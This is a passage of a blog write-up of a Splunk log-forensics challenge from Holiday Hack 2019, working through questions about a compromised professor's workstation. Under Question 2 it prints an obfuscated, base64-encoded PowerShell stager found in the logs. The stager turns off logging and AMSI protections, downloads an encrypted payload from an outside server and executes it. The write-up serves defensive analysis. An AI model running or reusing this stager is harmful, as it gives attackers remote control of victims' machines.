<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Splunk is a log collection and analysis tool. You can look at all the events for your network and highlight weird ones. In this case, we’re given some existing logs and told an attack is somewhere in">
<meta property="og:type" content="article">
<meta property="og:title" content="Splunk">
<meta property="og:url" content="http://tcmal.xyz/splunk/index.html">
<meta property="og:site_name" content="tcmal">
<meta property="og:description" content="Splunk is a log collection and analysis tool. You can look at all the events for your network and highlight weird ones. In this case, we’re given some existing logs and told an attack is somewhere in">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-01-19T00:00:00.000Z">
<meta property="article:modified_time" content="2020-11-26T11:48:41.484Z">
<meta property="article:author" content="tcmal">
<meta property="article:tag" content="Infosec">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="Forensics">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Splunk</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/archives/">Recent</a></li>
         
          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/recover-document/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/steam-tunnels/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://tcmal.xyz/splunk/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://tcmal.xyz/splunk/&text=Splunk" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://tcmal.xyz/splunk/&is_video=false&description=Splunk" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Splunk&body=Check out this article: http://tcmal.xyz/splunk/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://tcmal.xyz/splunk/&name=Splunk&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://tcmal.xyz/splunk/&t=Splunk" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-1"><span class="toc-number">1.</span> <span class="toc-text">Question 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-2"><span class="toc-number">2.</span> <span class="toc-text">Question 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-3"><span class="toc-number">3.</span> <span class="toc-text">Question 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-4"><span class="toc-number">4.</span> <span class="toc-text">Question 4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-5"><span class="toc-number">5.</span> <span class="toc-text">Question 5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-6"><span class="toc-number">6.</span> <span class="toc-text">Question 6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-7"><span class="toc-number">7.</span> <span class="toc-text">Question 7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Final-Question"><span class="toc-number">8.</span> <span class="toc-text">Final Question</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Splunk
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">tcmal</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-01-19T00:00:00.000Z" itemprop="datePublished">2020-01-19</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Holiday-Hack-2019/">Holiday Hack 2019</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Forensics/" rel="tag">Forensics</a>, <a class="tag-link" href="/tags/Infosec/" rel="tag">Infosec</a>, <a class="tag-link" href="/tags/Windows/" rel="tag">Windows</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>Splunk is a log collection and analysis tool. You can look at all the events for your network and highlight weird ones. In this case, we’re given some existing logs and told an attack is somewhere in there.</p>
<h1 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h1><blockquote>
<p>What is the short host name of Professor Banas’ computer? </p>
</blockquote>
<p>We can search for <code>*</code>, all events, and look at the sidebar. If we click on <code>host</code> it’ll show us all the values for this attribute - in this case all the different hosts that data was collected from - <code>sweetums</code>, <code>SWEETUMS</code> and <code>stoq.elfu.org</code>. To be thorough we can click on <code>stoq.elfu.org</code> to only show events from that host and see that none of them are from windows event logs, so it’s safe to assume this isn’t a workstation and we don’t need to worry about it. So we know the professor’s workstation is <code>sweetums</code>.</p>
<h1 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h1><blockquote>
<p>What is the name of the sensitive file that was likely accessed and copied by the attacker?</p>
</blockquote>
<p>Let’s start by looking at all the events from the workstation with <code>host=&quot;sweetums&quot;</code>. The first thing we see is an event from powershell, which was called with this command line invocation:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBCAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAE8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUAbgBlAFIAaQBDAC4ARABJAEMAVABJAG8ATgBBAHIAeQBbAFMAdAByAEkATgBHACwAUwB5AFMAVABFAG0ALgBPAGIAagBlAGMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABTAEUAewBbAFMAQwByAEkAUABUAEIAbABPAEMASwBdAC4AIgBHAEUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBBAEwAVQBlACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBqAEUAYwB0ACAAQwBvAGwAbABFAGMAVABpAG8AbgBzAC4ARwBFAG4AZQByAEkAQwAuAEgAYQBzAGgAUwBlAFQAWwBzAFQAcgBJAE4ARwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAUwBTAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA&#x2F;AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbABVAGUAKAAkAE4AVQBsAEwALAAkAFQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAE0ALgBOAGUAVAAuAFMARQBSAHYAaQBjAEUAUABvAEkAbgBUAE0AYQBOAGEARwBlAHIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBPAE4AdABJAG4AVQBlAD0AMAA7ACQAdwBjAD0ATgBFAHcALQBPAGIAagBFAEMAVAAgAFMAeQBzAFQARQBNAC4ATgBlAFQALgBXAGUAQgBDAEwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAEQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBvAFgAeQA9AFsAUwB5AFMAVABlAE0ALgBOAGUAdAAuAFcAZQBCAFIARQBRAHUARQBTAFQAXQA6ADoARABFAEYAYQBVAEwAVABXAGUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAUgBvAFgAeQAuAEMAUgBFAEQAZQBuAFQASQBBAGwAcwAgAD0AIABbAFMAeQBTAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAGUATgBUAGkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAGUARgBhAHUAbABUAE4AZQBUAHcATwBSAGsAQwBSAEUARABlAG4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAeAB0AC4ARQBuAGMATwBkAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcAegBkACEAUABtAHcAMwBKAC8AcQBuAHUAVwBvAEgAWAB+AD0AZwAuAHsAPgBwACwARwBFAF0AOgB8ACMATQBSACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA0ADQALgAyADAAMgAuADQANgAuADIAMQA0ADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAVwBDAC4ASABFAEEARABFAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AcgBlAFQAOQBYAFEAQQBsADAARQBNAEoAbgB4AHUAawBFAFoAeQAvADcATQBTADcAMABYADQAPQAiACkAOwAkAEQAQQBUAGEAPQAkAFcAQwAuAEQAbwB3AG4AbABPAEEARABEAEEAdABBACgAJABzAEUAcgArACQAVAApADsAJABJAHYAPQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAYQB0AEEALgBsAEUATgBHAHQASABdADsALQBKAE8ASQBOAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p><code>-enc</code> is used to pass encoded scripts, so we know the big string in our command line is just base64 encoded. If we <a href="(https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Decode_text('OEM%20United%20States%20(437)')Encode_text('UTF-8%20(65001)'/disabled)&input=U1FCR0FDZ0FKQUJRQUZNQVZnQmxBSElBVXdCcEFHOEFUZ0JVQUdFQVFnQk1BR1VBTGdCUUFGTUFWZ0JGQUZJQWN3QkpBRThBYmdBdUFFMEFRUUJLQUc4QWNnQWdBQzBBWndCRkFDQUFNd0FwQUhzQUpBQkhBRkFBUmdBOUFGc0FVZ0JsQUdZQVhRQXVBRUVBVXdCekFFVUFUUUJDQUd3QWVRQXVBRWNBUlFCVUFGUUFlUUJRQUVVQUtBQW5BRk1BZVFCekFIUUFaUUJ0QUM0QVRRQmhBRzRBWVFCbkFHVUFiUUJsQUc0QWRBQXVBRUVBZFFCMEFHOEFiUUJoQUhRQWFRQnZBRzRBTGdCVkFIUUFhUUJzQUhNQUp3QXBBQzRBSWdCSEFFVUFkQUJHQUdrQVJRQmdBRXdBWkFBaUFDZ0FKd0JqQUdFQVl3Qm9BR1VBWkFCSEFISUFid0IxQUhBQVVBQnZBR3dBYVFCakFIa0FVd0JsQUhRQWRBQnBBRzRBWndCekFDY0FMQUFuQUU0QUp3QXJBQ2NBYndCdUFGQUFkUUJpQUd3QWFRQmpBQ3dBVXdCMEFHRUFkQUJwQUdNQUp3QXBBRHNBU1FCR0FDZ0FKQUJIQUZBQVJnQXBBSHNBSkFCSEFGQUFRd0E5QUNRQVJ3QlFBRVlBTGdCSEFHVUFWQUJXQUVFQWJBQjFBRVVBS0FBa0FHNEFWUUJzQUV3QUtRQTdBRWtBWmdBb0FDUUFSd0JRQUVNQVd3QW5BRk1BWXdCeUFHa0FjQUIwQUVJQUp3QXJBQ2NBYkFCdkFHTUFhd0JNQUc4QVp3Qm5BR2tBYmdCbkFDY0FYUUFwQUhzQUpBQkhBRkFBUXdCYkFDY0FVd0JqQUhJQWFRQndBSFFBUWdBbkFDc0FKd0JzQUc4QVl3QnJBRXdBYndCbkFHY0FhUUJ1QUdjQUp3QmRBRnNBSndCRkFHNEFZUUJpQUd3QVpRQlRBR01BY2dCcEFIQUFkQUJDQUNjQUt3QW5BR3dBYndCakFHc0FUQUJ2QUdjQVp3QnBBRzRBWndBbkFGMEFQUUF3QURzQUpBQkhBRkFBUXdCYkFDY0FVd0JqQUhJQWFRQndBSFFBUWdBbkFDc0FKd0JzQUc4QVl3QnJBRXdBYndCbkFHY0FhUUJ1QUdjQUp3QmRBRnNBSndCRkFHNEFZUUJpQUd3QVpRQlRBR01BY2dCcEFIQUFkQUJDQUd3QWJ3QmpBR3NBU1FCdUFIWUFid0JqQUdFQWRBQnBBRzhBYmdCTUFHOEFad0JuQUdrQWJnQm5BQ2NBWFFBOUFEQUFmUUFrQUhZQVlRQnNBRDBBV3dCREFFOEFUQUJzQUVVQVl3QlVBR2tBYndCT0FITUFMZ0JIQUVVQWJnQmxBRklBYVFCREFDNEFSQUJKQUVNQVZBQkpBRzhBVGdCQkFISUFlUUJiQUZNQWRBQnlBRWtBVGdCSEFDd0FVd0I1QUZNQVZBQkZBRzBBTGdCUEFHSUFhZ0JsQUdNQVZBQmRBRjBBT2dBNkFFNEFaUUJYQUNnQUtRQTdBQ1FBZGdCQkFHd0FMZ0JCQUdRQVJBQW9BQ2NBUlFCdUFHRUFZZ0JzQUdVQVV3QmpBSElBYVFCd0FIUUFRZ0FuQUNzQUp3QnNBRzhBWXdCckFFd0Fid0JuQUdjQWFRQnVBR2NBSndBc0FEQUFLUUE3QUNRQWRnQmhBRXdBTGdCQkFFUUFaQUFvQUNjQVJRQnVBR0VBWWdCc0FHVUFVd0JqQUhJQWFRQndBSFFBUWdCc0FHOEFZd0JyQUVrQWJnQjJBRzhBWXdCaEFIUUFhUUJ2QUc0QVRBQnZBR2NBWndCcEFHNEFad0FuQUN3QU1BQXBBRHNBSkFCSEFGQUFRd0JiQUNjQVNBQkxBRVVBV1FCZkFFd0FUd0JEQUVFQVRBQmZBRTBBUVFCREFFZ0FTUUJPQUVVQVhBQlRBRzhBWmdCMEFIY0FZUUJ5QUdVQVhBQlFBRzhBYkFCcEFHTUFhUUJsQUhNQVhBQk5BR2tBWXdCeUFHOEFjd0J2QUdZQWRBQmNBRmNBYVFCdUFHUUFid0IzQUhNQVhBQlFBRzhBZHdCbEFISUFVd0JvQUdVQWJBQnNBRndBVXdCakFISUFhUUJ3QUhRQVFnQW5BQ3NBSndCc0FHOEFZd0JyQUV3QWJ3Qm5BR2NBYVFCdUFHY0FKd0JkQUQwQUpBQldBRUVBYkFCOUFFVUFiQUJUQUVVQWV3QmJBRk1BUXdCeUFFa0FVQUJVQUVJQWJBQlBBRU1BU3dCZEFDNEFJZ0JIQUVVQWRBQkdBRWtBWlFCZ0FHd0FSQUFpQUNnQUp3QnpBR2tBWndCdUFHRUFkQUIxQUhJQVpRQnpBQ2NBTEFBbkFFNEFKd0FyQUNjQWJ3QnVBRkFBZFFCaUFHd0FhUUJqQUN3QVV3QjBBR0VBZEFCcEFHTUFKd0FwQUM0QVV3QkZBRlFBVmdCQkFFd0FWUUJsQUNnQUpBQk9BRlVBYkFCc0FDd0FLQUJPQUVVQVZ3QXRBRThBUWdCcUFFVUFZd0IwQUNBQVF3QnZBR3dBYkFCRkFHTUFWQUJwQUc4QWJnQnpBQzRBUndCRkFHNEFaUUJ5QUVrQVF3QXVBRWdBWVFCekFHZ0FVd0JsQUZRQVd3QnpBRlFBY2dCSkFFNEFSd0JkQUNrQUtRQjlBRnNBVWdCRkFHWUFYUUF1QUVFQVV3QlRBRVVBVFFCQ0FHd0FXUUF1QUVjQVJRQlVBRlFBV1FCUUFHVUFLQUFuQUZNQWVRQnpBSFFBWlFCdEFDNEFUUUJoQUc0QVlRQm5BR1VBYlFCbEFHNEFkQUF1QUVFQWRRQjBBRzhBYlFCaEFIUUFhUUJ2QUc0QUxnQkJBRzBBY3dCcEFGVUFkQUJwQUd3QWN3QW5BQ2tBZkFBL0FIc0FKQUJmQUgwQWZBQWxBSHNBSkFCZkFDNEFSd0JGQUZRQVJnQnBBR1VBYkFCRUFDZ0FKd0JoQUcwQWN3QnBBRWtBYmdCcEFIUUFSZ0JoQUdrQWJBQmxBR1FBSndBc0FDY0FUZ0J2QUc0QVVBQjFBR0lBYkFCcEFHTUFMQUJUQUhRQVlRQjBBR2tBWXdBbkFDa0FMZ0JUQUVVQWRBQldBR0VBYkFCVkFHVUFLQUFrQUU0QVZRQnNBRXdBTEFBa0FGUUFjZ0IxQUdVQUtRQjlBRHNBZlFBN0FGc0FVd0I1QUZNQWRBQmxBRTBBTGdCT0FHVUFWQUF1QUZNQVJRQlNBSFlBYVFCakFFVUFVQUJ2QUVrQWJnQlVBRTBBWVFCT0FHRUFSd0JsQUhJQVhRQTZBRG9BUlFCWUFGQUFaUUJqQUZRQU1RQXdBREFBUXdCUEFFNEFkQUJKQUc0QVZRQmxBRDBBTUFBN0FDUUFkd0JqQUQwQVRnQkZBSGNBTFFCUEFHSUFhZ0JGQUVNQVZBQWdBRk1BZVFCekFGUUFSUUJOQUM0QVRnQmxBRlFBTGdCWEFHVUFRZ0JEQUV3QWFRQkZBRTRBVkFBN0FDUUFkUUE5QUNjQVRRQnZBSG9BYVFCc0FHd0FZUUF2QURVQUxnQXdBQ0FBS0FCWEFHa0FiZ0JrQUc4QWR3QnpBQ0FBVGdCVUFDQUFOZ0F1QURFQU93QWdBRmNBVHdCWEFEWUFOQUE3QUNBQVZBQnlBR2tBWkFCbEFHNEFkQUF2QURjQUxnQXdBRHNBSUFCeUFIWUFPZ0F4QURFQUxnQXdBQ2tBSUFCc0FHa0Fhd0JsQUNBQVJ3QmxBR01BYXdCdkFDY0FPd0FrQUhjQVF3QXVBRWdBUlFCQkFFUUFSUUJ5QUZNQUxnQkJBRVFBWkFBb0FDY0FWUUJ6QUdVQWNnQXRBRUVBWndCbEFHNEFkQUFuQUN3QUpBQjFBQ2tBT3dBa0FGY0FZd0F1QUZBQWNnQnZBRmdBZVFBOUFGc0FVd0I1QUZNQVZBQmxBRTBBTGdCT0FHVUFkQUF1QUZjQVpRQkNBRklBUlFCUkFIVUFSUUJUQUZRQVhRQTZBRG9BUkFCRkFFWUFZUUJWQUV3QVZBQlhBR1VBWWdCUUFISUFid0JZQUhrQU93QWtBRmNBUXdBdUFGQUFVZ0J2QUZnQWVRQXVBRU1BVWdCRkFFUUFaUUJ1QUZRQVNRQkJBR3dBY3dBZ0FEMEFJQUJiQUZNQWVRQlRBRlFBUlFCdEFDNEFUZ0JGQUZRQUxnQkRBRklBWlFCa0FHVUFUZ0JVQUdrQVFRQnNBRU1BUVFCakFFZ0FaUUJkQURvQU9nQkVBR1VBUmdCaEFIVUFiQUJVQUU0QVpRQlVBSGNBVHdCU0FHc0FRd0JTQUVVQVJBQmxBRzRBVkFCcEFFRUFUQUJUQURzQUpBQlRBR01BY2dCcEFIQUFkQUE2QUZBQWNnQnZBSGdBZVFBZ0FEMEFJQUFrQUhjQVl3QXVBRkFBY2dCdkFIZ0FlUUE3QUNRQVN3QTlBRnNBVXdCNUFGTUFWQUJGQUUwQUxnQlVBR1VBZUFCMEFDNEFSUUJ1QUdNQVR3QmtBRWtBVGdCSEFGMEFPZ0E2QUVFQVV3QkRBRWtBU1FBdUFFY0FaUUJVQUVJQVdRQjBBR1VBVXdBb0FDY0FlZ0JrQUNFQVVBQnRBSGNBTXdCS0FDOEFjUUJ1QUhVQVZ3QnZBRWdBV0FCK0FEMEFad0F1QUhzQVBnQndBQ3dBUndCRkFGMEFPZ0I4QUNNQVRRQlNBQ2NBS1FBN0FDUUFVZ0E5QUhzQUpBQkVBQ3dBSkFCTEFEMEFKQUJCQUZJQVJ3QnpBRHNBSkFCVEFEMEFNQUF1QUM0QU1nQTFBRFVBT3dBd0FDNEFMZ0F5QURVQU5RQjhBQ1VBZXdBa0FFb0FQUUFvQUNRQVNnQXJBQ1FBVXdCYkFDUUFYd0JkQUNzQUpBQkxBRnNBSkFCZkFDVUFKQUJMQUM0QVF3QlBBRlVBYmdCMEFGMEFLUUFsQURJQU5RQTJBRHNBSkFCVEFGc0FKQUJmQUYwQUxBQWtBRk1BV3dBa0FFb0FYUUE5QUNRQVV3QmJBQ1FBU2dCZEFDd0FKQUJUQUZzQUpBQmZBRjBBZlFBN0FDUUFSQUI4QUNVQWV3QWtBRWtBUFFBb0FDUUFTUUFyQURFQUtRQWxBRElBTlFBMkFEc0FKQUJJQUQwQUtBQWtBRWdBS3dBa0FGTUFXd0FrQUVrQVhRQXBBQ1VBTWdBMUFEWUFPd0FrQUZNQVd3QWtBRWtBWFFBc0FDUUFVd0JiQUNRQVNBQmRBRDBBSkFCVEFGc0FKQUJJQUYwQUxBQWtBRk1BV3dBa0FFa0FYUUE3QUNRQVh3QXRBRUlBV0FCdkFGSUFKQUJUQUZzQUtBQWtBRk1BV3dBa0FFa0FYUUFyQUNRQVV3QmJBQ1FBU0FCZEFDa0FKUUF5QURVQU5nQmRBSDBBZlFBN0FDUUFjd0JsQUhJQVBRQW5BR2dBZEFCMEFIQUFPZ0F2QUM4QU1RQTBBRFFBTGdBeUFEQUFNZ0F1QURRQU5nQXVBRElBTVFBMEFEb0FPQUF3QURnQU1BQW5BRHNBSkFCMEFEMEFKd0F2QUdFQVpBQnRBR2tBYmdBdkFHY0FaUUIwQUM0QWNBQm9BSEFBSndBN0FDUUFWd0JEQUM0QVNBQkZBRUVBUkFCRkFISUFjd0F1QUVFQVpBQmtBQ2dBSWdCREFHOEFid0JyQUdrQVpRQWlBQ3dBSWdCekFHVUFjd0J6QUdrQWJ3QnVBRDBBY2dCbEFGUUFPUUJZQUZFQVFRQnNBREFBUlFCTkFFb0FiZ0I0QUhVQWF3QkZBRm9BZVFBdkFEY0FUUUJUQURjQU1BQllBRFFBUFFBaUFDa0FPd0FrQUVRQVFRQlVBR0VBUFFBa0FGY0FRd0F1QUVRQWJ3QjNBRzRBYkFCUEFFRUFSQUJFQUVFQWRBQkJBQ2dBSkFCekFFVUFjZ0FyQUNRQVZBQXBBRHNBSkFCSkFIWUFQUUFrQUVRQVlRQ